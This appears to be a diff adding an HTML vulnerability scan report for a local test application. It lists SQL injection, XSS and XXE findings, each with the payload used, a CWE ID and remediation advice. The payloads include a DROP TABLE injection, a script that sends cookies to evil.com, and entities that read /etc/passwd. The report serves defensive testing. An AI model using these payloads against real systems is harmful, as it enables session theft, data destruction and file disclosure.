@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SentinelVulnScan Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+        h2 { color: #2c3e50; margin-top: 30px; }
+        .summary { background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .summary-item { margin: 10px 0; }
+        .vulnerability { background-color: #fff; border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .vulnerability h3 { color: #3498db; margin-top: 0; }
+        .vulnerability-details { display: grid; grid-template-columns: 150px 1fr; gap: 10px; margin-top: 15px; }
+        .label { font-weight: bold; color: #555; }
+        .critical { background-color: #ffebee; border-left: 5px solid #f44336; }
+        .high { background-color: #fff8e1; border-left: 5px solid #ffc107; }
+        .medium { background-color: #e3f2fd; border-left: 5px solid #2196f3; }
+        .low { background-color: #e8f5e9; border-left: 5px solid #4caf50; }
+        .info { background-color: #f3e5f5; border-left: 5px solid #9c27b0; }
+        .evidence { background-color: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace; white-space: pre-wrap; margin-top: 5px; }
+        .footer { margin-top: 30px; text-align: center; font-size: 0.9em; color: #777; }
+        .chart { width: 100%; max-width: 500px; margin: 20px auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SentinelVulnScan Vulnerability Report</h1>
+        <div class="summary">
+            <div class="summary-item"><strong>Target URL:</strong> http://localhost:5000</div>
+            <div class="summary-item"><strong>Scan Date:</strong> 2025-05-19 23:21:53</div>
+            <div class="summary-item"><strong>Total Vulnerabilities Found:</strong> 79</div>
+            <div class="summary-item"><strong>Critical:</strong> 35</div>
+            <div class="summary-item"><strong>High:</strong> 44</div>
+            <div class="summary-item"><strong>Medium:</strong> 0</div>
+            <div class="summary-item"><strong>Low:</strong> 0</div>
+            <div class="summary-item"><strong>Info:</strong> 0</div>
+        </div>
+        <h2>SqlInjection Vulnerabilities (12)</h2>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' OR '1'='1</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' OR 1=1--</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>'; DROP TABLE users; --</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>1' OR '1' = '1</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>1' AND 1=1--</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' UNION SELECT 1,2,3--</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' UNION SELECT username,password,1 FROM users--</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>admin' --</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>admin' #</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' OR 1=1 #</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' OR 1=1 LIMIT 1--</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>SqlInjection vulnerability found in username parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/login</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>username</div>
+                <div class="label">Payload:</div><div>' OR '1'='1' /*</div>
+                <div class="label">CWE ID:</div><div>CWE-89</div>
+                <div class="label">Impact:</div><div>SQL injection can lead to unauthorized access to sensitive data, data modification, data deletion, administrative operations on the database, and in some cases, command execution on the server.</div>
+                <div class="label">Remediation:</div><div>Use parameterized queries or prepared statements instead of concatenating user input. Implement input validation and sanitization. Use stored procedures with parameterized inputs. Apply the principle of least privilege to database accounts.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated SQL error response: You have an error in your SQL syntax</div>
+            </div>
+        </div>
+        <h2>XssInjection Vulnerabilities (15)</h2>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><script>alert('XSS')</script></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <script>alert('XSS')</script></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><img src=x onerror=alert('XSS')></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <img src=x onerror=alert('XSS')></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><svg onload=alert('XSS')></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <svg onload=alert('XSS')></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div>javascript:alert('XSS')</div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: javascript:alert('XSS')</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><body onload=alert('XSS')></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <body onload=alert('XSS')></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><iframe src="javascript:alert('XSS')"></iframe></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <iframe src="javascript:alert('XSS')"></iframe></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div>"><script>alert('XSS')</script></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: "><script>alert('XSS')</script></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div>';alert('XSS');//</div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: ';alert('XSS');//</div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><script>fetch('https://evil.com?cookie='+document.cookie)</script></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <script>fetch('https://evil.com?cookie='+document.cookie)</script></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><img src=1 href=1 onerror="javascript:alert('XSS')"></img></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <img src=1 href=1 onerror="javascript:alert('XSS')"></img></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><audio src=1 href=1 onerror="javascript:alert('XSS')"></audio></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <audio src=1 href=1 onerror="javascript:alert('XSS')"></audio></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><video src=1 href=1 onerror="javascript:alert('XSS')"></video></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <video src=1 href=1 onerror="javascript:alert('XSS')"></video></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><body src=1 href=1 onerror="javascript:alert('XSS')"></body></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <body src=1 href=1 onerror="javascript:alert('XSS')"></body></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><object src=1 href=1 onerror="javascript:alert('XSS')"></object></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <object src=1 href=1 onerror="javascript:alert('XSS')"></object></div>
+            </div>
+        </div>
+        <div class="vulnerability high">
+            <h3>XssInjection vulnerability found in q parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>High</div>
+                <div class="label">URL:</div><div>http://localhost:5000/search?q=test</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>q</div>
+                <div class="label">Payload:</div><div><script>alert(document.domain)</script></div>
+                <div class="label">CWE ID:</div><div>CWE-79</div>
+                <div class="label">Impact:</div><div>Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, keystroke logging, phishing attacks, and malicious redirects. It allows attackers to execute arbitrary JavaScript in victims' browsers.</div>
+                <div class="label">Remediation:</div><div>Implement context-specific output encoding. Validate and sanitize all user inputs. Use Content-Security-Policy headers. Consider using auto-escaping template systems. Use frameworks with built-in XSS protection.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains unencoded payload: <script>alert(document.domain)</script></div>
+            </div>
+        </div>
+        <h2>XmlInjection Vulnerabilities (8)</h2>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/process-xml</div>
+                <div class="label">Method:</div><div>POST</div>
+                <div class="label">Parameter:</div><div>XML Body</div>
+                <div class="label">Payload:</div><div><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></div>
+                <div class="label">CWE ID:</div><div>CWE-611</div>
+                <div class="label">Impact:</div><div>XML Injection can lead to disclosure of confidential data, server-side request forgery, denial of service, and in some cases, remote code execution. It can allow attackers to access resources that should not be publicly available.</div>
+                <div class="label">Remediation:</div><div>Disable XML external entity (XXE) processing. Use less complex data formats like JSON if possible. Validate and sanitize all XML input. Patch or upgrade XML parsers. Implement whitelisting for XML content.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains file content that should not be accessible</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>XmlInjection vulnerability found in XML Body parameter</h3>
